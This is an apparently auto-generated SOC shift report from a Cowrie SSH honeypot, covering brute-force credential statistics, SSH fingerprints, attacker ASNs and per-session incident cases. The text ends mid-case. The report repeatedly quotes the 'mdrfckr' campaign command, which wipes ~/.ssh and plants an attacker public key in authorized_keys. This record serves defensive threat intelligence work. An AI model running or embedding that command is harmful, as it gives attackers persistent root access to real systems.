# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-22 |
| **Generated At** | 2026-04-22T06:03:22Z |
| **Shift Time** | 06:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **244** |
| Confirmed Threats | **221** |
| False Positives Filtered | **23** (9.4%) |
| Unique Attacker IPs | **29** |
| Countries of Origin | **13** |
| High Severity Cases | **75** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **169** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **184** |
| Unique Credential Pairs | **60** |
| Unique Usernames | **31** |
| Unique Passwords | **57** |
| Successful Auth Pairs | **43** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 77 |
| `345gs5662d34` | 35 |
| `ubuntu` | 13 |
| `admin1234` | 4 |
| `usuario2` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 35 |
| `3245gs5662d34` | 35 |
| `admin1234` | 4 |
| `usuario2` | 4 |
| `123` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 35 |
| `root` | `3245gs5662d34` | 35 |
| `admin1234` | `admin1234` | 4 |
| `usuario2` | `usuario2` | 4 |
| `sambauser` | `sambauser123` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `!Q2w3e4r` | `34.173.236.227` | 2026-04-22T04:05:19 |
| `root` | `ZAQ!2wsx2018@@` | `172.206.32.4` | 2026-04-22T04:31:41 |
| `root` | `3245gs5662d34` | `172.206.32.4` | 2026-04-22T04:31:46 |
| `root` | `qazwsx000!@` | `172.206.32.4` | 2026-04-22T04:33:18 |
| `root` | `Qazwsx1234567#$` | `101.32.240.31` | 2026-04-22T04:36:13 |
| `root` | `3245gs5662d34` | `101.32.240.31` | 2026-04-22T04:36:16 |
| `root` | `qazwsx1234@` | `101.32.240.31` | 2026-04-22T04:38:01 |
| `root` | `Asd!@#` | `172.206.32.4` | 2026-04-22T04:38:38 |
| `root` | `Qazwsx1234567@#` | `172.206.32.4` | 2026-04-22T04:40:26 |
| `root` | `Qazwsx2021@123` | `101.32.240.31` | 2026-04-22T04:41:29 |
| `root` | `azerty123` | `172.206.32.4` | 2026-04-22T04:42:16 |
| `root` | `ZZdd123` | `101.32.240.31` | 2026-04-22T04:44:02 |
| `root` | `ZAQ!2wsx2018#` | `51.163.39.213` | 2026-04-22T04:46:03 |
| `root` | `3245gs5662d34` | `51.163.39.213` | 2026-04-22T04:46:06 |
| `root` | `Sss123456` | `51.163.39.213` | 2026-04-22T04:46:46 |
| `root` | `qwertyui1234567` | `172.206.32.4` | 2026-04-22T04:47:27 |
| `root` | `qazwsx1234@` | `51.163.39.213` | 2026-04-22T04:47:31 |
| `root` | `ali123` | `101.32.240.31` | 2026-04-22T04:48:15 |
| `root` | `Qazwsx2021@123` | `51.163.39.213` | 2026-04-22T04:48:17 |
| `root` | `root1234567@123` | `172.206.32.4` | 2026-04-22T04:49:17 |
| `root` | `ZAQ!2wsx2018#` | `101.32.240.31` | 2026-04-22T04:50:00 |
| `root` | `ZZdd123` | `51.163.39.213` | 2026-04-22T04:51:13 |
| `root` | `Qazwsx1234567#$` | `51.163.39.213` | 2026-04-22T04:52:40 |
| `root` | `Zz123456@` | `172.206.32.4` | 2026-04-22T04:52:47 |
| `root` | `ZAQ!2wsx2025!@` | `101.32.240.31` | 2026-04-22T04:53:21 |
| `root` | `ali123` | `51.163.39.213` | 2026-04-22T04:53:25 |
| `root` | `Sss123456` | `101.32.240.31` | 2026-04-22T04:55:57 |
| `root` | `ZAQ!2wsx2025!@` | `51.163.39.213` | 2026-04-22T04:57:53 |
| `root` | `zaq12wsx!` | `172.206.32.4` | 2026-04-22T05:03:34 |
| `root` | `Sss123456` | `81.30.162.19` | 2026-04-22T05:05:32 |
| `root` | `3245gs5662d34` | `81.30.162.19` | 2026-04-22T05:05:36 |
| `root` | `124578` | `172.206.32.4` | 2026-04-22T05:08:58 |
| `root` | ` ` | `139.196.218.159` | 2026-04-22T05:09:20 |
| `root` | `ZAQ!2wsx2018#` | `81.30.162.19` | 2026-04-22T05:12:03 |
| `root` | `BBzz1234` | `172.206.32.4` | 2026-04-22T05:12:32 |
| `root` | `Qazwsx1234567#$` | `81.30.162.19` | 2026-04-22T05:13:39 |
| `root` | `Qazwsx2021@123` | `81.30.162.19` | 2026-04-22T05:14:34 |
| `root` | `ZAQ!2wsx2025!@` | `81.30.162.19` | 2026-04-22T05:17:50 |
| `root` | `qazwsx1234@` | `81.30.162.19` | 2026-04-22T05:19:27 |
| `root` | `ZZdd123` | `81.30.162.19` | 2026-04-22T05:20:15 |
| `root` | `ali123` | `81.30.162.19` | 2026-04-22T05:22:37 |
| `root` | `admin` | `176.65.148.44` | 2026-04-22T05:23:19 |
| `root` | `password` | `60.29.174.122` | 2026-04-22T05:43:59 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **244** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 182 |
| Go SSH scanner | 9 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 127 | 4 |
| `03a80b21afa8...` | Modern SSH client | 50 | 3 |
| `0a07365cc01f...` | Generic scanner | 3 | 1 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |
| `2f5ebb184f5d...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 127 | 4 | libssh-based |
| `03a80b21afa8...` | libssh | 50 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 4 | — |
| `0a07365cc01f...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `2f5ebb184f5d...` | Unknown | 2 | 1 | Modern SSH client |
| `7216c7c47391...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 35 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `81.30.162.19`, `51.163.39.213`, `172.206.32.4`, `101.32.240.31`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **29** |
| Unique ASNs | **24** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS3462` | Data Communication Business Group | 2 | LOW |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | LOW |
| `AS5713` | Telkom SA Ltd. | 1 | LOW |
| `AS396982` | Google LLC | 1 | LOW |
| `AS20001` | Charter Communications Inc | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (75)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1b645a103525

| Field | Detail |
|---|---|
| **Source IP** | `34.173.236[.]227` |
| **First Seen** | 2026-04-22 04:05 |
| **Last Seen** | 2026-04-22 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:05:18` | `cowrie.session.connect` |
| `2026-04-22 04:05:18` | `cowrie.client.version` |
| `2026-04-22 04:05:19` | `cowrie.client.kex` |
| `2026-04-22 04:05:19` | `cowrie.login.success` |
| `2026-04-22 04:05:20` | `cowrie.session.params` |
| `2026-04-22 04:05:20` | `cowrie.command.input` |
| `2026-04-22 04:05:20` | `cowrie.log.closed` |
| `2026-04-22 04:05:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.173.236[.]227` to AbuseIPDB if not already reported
- [ ] Block `34.173.236[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dde18d501e2e

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 04:31 |
| **Last Seen** | 2026-04-22 04:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:31:40` | `cowrie.session.connect` |
| `2026-04-22 04:31:40` | `cowrie.client.version` |
| `2026-04-22 04:31:40` | `cowrie.client.kex` |
| `2026-04-22 04:31:41` | `cowrie.login.success` |
| `2026-04-22 04:31:42` | `cowrie.session.params` |
| `2026-04-22 04:31:42` | `cowrie.command.input` |
| `2026-04-22 04:31:42` | `cowrie.command.failed` |
| `2026-04-22 04:31:42` | `cowrie.log.closed` |
| `2026-04-22 04:31:42` | `cowrie.session.params` |
| `2026-04-22 04:31:42` | `cowrie.command.input` |
| `2026-04-22 04:31:42` | `cowrie.session.file_download` |
| `2026-04-22 04:31:42` | `cowrie.log.closed` |
| `2026-04-22 04:31:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f785eb53edf0

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 04:31 |
| **Last Seen** | 2026-04-22 04:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:31:45` | `cowrie.session.connect` |
| `2026-04-22 04:31:45` | `cowrie.client.version` |
| `2026-04-22 04:31:45` | `cowrie.client.kex` |
| `2026-04-22 04:31:46` | `cowrie.login.success` |
| `2026-04-22 04:31:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a725a4f875a

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 04:33 |
| **Last Seen** | 2026-04-22 04:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:33:17` | `cowrie.session.connect` |
| `2026-04-22 04:33:17` | `cowrie.client.version` |
| `2026-04-22 04:33:18` | `cowrie.client.kex` |
| `2026-04-22 04:33:18` | `cowrie.login.success` |
| `2026-04-22 04:33:19` | `cowrie.session.params` |
| `2026-04-22 04:33:19` | `cowrie.command.input` |
| `2026-04-22 04:33:19` | `cowrie.command.failed` |
| `2026-04-22 04:33:19` | `cowrie.log.closed` |
| `2026-04-22 04:33:20` | `cowrie.session.params` |
| `2026-04-22 04:33:20` | `cowrie.command.input` |
| `2026-04-22 04:33:20` | `cowrie.session.file_download` |
| `2026-04-22 04:33:20` | `cowrie.log.closed` |
| `2026-04-22 04:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-194b94a5784a

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 04:33 |
| **Last Seen** | 2026-04-22 04:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:33:23` | `cowrie.session.connect` |
| `2026-04-22 04:33:23` | `cowrie.client.version` |
| `2026-04-22 04:33:23` | `cowrie.client.kex` |
| `2026-04-22 04:33:24` | `cowrie.login.success` |
| `2026-04-22 04:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ab9f5e9aea9

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-04-22 04:36 |
| **Last Seen** | 2026-04-22 04:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:36:13` | `cowrie.session.connect` |
| `2026-04-22 04:36:13` | `cowrie.client.version` |
| `2026-04-22 04:36:13` | `cowrie.client.kex` |
| `2026-04-22 04:36:13` | `cowrie.login.success` |
| `2026-04-22 04:36:13` | `cowrie.session.params` |
| `2026-04-22 04:36:13` | `cowrie.command.input` |
| `2026-04-22 04:36:13` | `cowrie.command.failed` |
| `2026-04-22 04:36:13` | `cowrie.log.closed` |
| `2026-04-22 04:36:14` | `cowrie.session.params` |
| `2026-04-22 04:36:14` | `cowrie.command.input` |
| `2026-04-22 04:36:14` | `cowrie.session.file_download` |
| `2026-04-22 04:36:14` | `cowrie.log.closed` |
| `2026-04-22 04:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00da2e7bbcb5

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-04-22 04:36 |
| **Last Seen** | 2026-04-22 04:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:36:15` | `cowrie.session.connect` |
| `2026-04-22 04:36:15` | `cowrie.client.version` |
| `2026-04-22 04:36:15` | `cowrie.client.kex` |
| `2026-04-22 04:36:16` | `cowrie.login.success` |
| `2026-04-22 04:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bee10c0fde3

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-04-22 04:38 |
| **Last Seen** | 2026-04-22 04:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:38:00` | `cowrie.session.connect` |
| `2026-04-22 04:38:00` | `cowrie.client.version` |
| `2026-04-22 04:38:00` | `cowrie.client.kex` |
| `2026-04-22 04:38:01` | `cowrie.login.success` |
| `2026-04-22 04:38:01` | `cowrie.session.params` |
| `2026-04-22 04:38:01` | `cowrie.command.input` |
| `2026-04-22 04:38:01` | `cowrie.command.failed` |
| `2026-04-22 04:38:01` | `cowrie.log.closed` |
| `2026-04-22 04:38:01` | `cowrie.session.params` |
| `2026-04-22 04:38:01` | `cowrie.command.input` |
| `2026-04-22 04:38:01` | `cowrie.session.file_download` |
| `2026-04-22 04:38:01` | `cowrie.log.closed` |
| `2026-04-22 04:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adc24d74730b

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-04-22 04:38 |
| **Last Seen** | 2026-04-22 04:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:38:03` | `cowrie.session.connect` |
| `2026-04-22 04:38:03` | `cowrie.client.version` |
| `2026-04-22 04:38:03` | `cowrie.client.kex` |
| `2026-04-22 04:38:03` | `cowrie.login.success` |
| `2026-04-22 04:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35abb3628403

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 04:38 |
| **Last Seen** | 2026-04-22 04:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:38:37` | `cowrie.session.connect` |
| `2026-04-22 04:38:37` | `cowrie.client.version` |
| `2026-04-22 04:38:37` | `cowrie.client.kex` |
| `2026-04-22 04:38:38` | `cowrie.login.success` |
| `2026-04-22 04:38:39` | `cowrie.session.params` |
| `2026-04-22 04:38:39` | `cowrie.command.input` |
| `2026-04-22 04:38:39` | `cowrie.command.failed` |
| `2026-04-22 04:38:39` | `cowrie.log.closed` |
| `2026-04-22 04:38:40` | `cowrie.session.params` |
| `2026-04-22 04:38:40` | `cowrie.command.input` |
| `2026-04-22 04:38:40` | `cowrie.session.file_download` |
| `2026-04-22 04:38:40` | `cowrie.log.closed` |
| `2026-04-22 04:38:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-216d7e610e95

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 04:38 |
| **Last Seen** | 2026-04-22 04:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:38:42` | `cowrie.session.connect` |
| `2026-04-22 04:38:42` | `cowrie.client.version` |
| `2026-04-22 04:38:43` | `cowrie.client.kex` |
| `2026-04-22 04:38:44` | `cowrie.login.success` |
| `2026-04-22 04:38:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-425b5f50cf3a

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 04:40 |
| **Last Seen** | 2026-04-22 04:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:40:25` | `cowrie.session.connect` |
| `2026-04-22 04:40:25` | `cowrie.client.version` |
| `2026-04-22 04:40:25` | `cowrie.client.kex` |
| `2026-04-22 04:40:26` | `cowrie.login.success` |
| `2026-04-22 04:40:26` | `cowrie.session.params` |
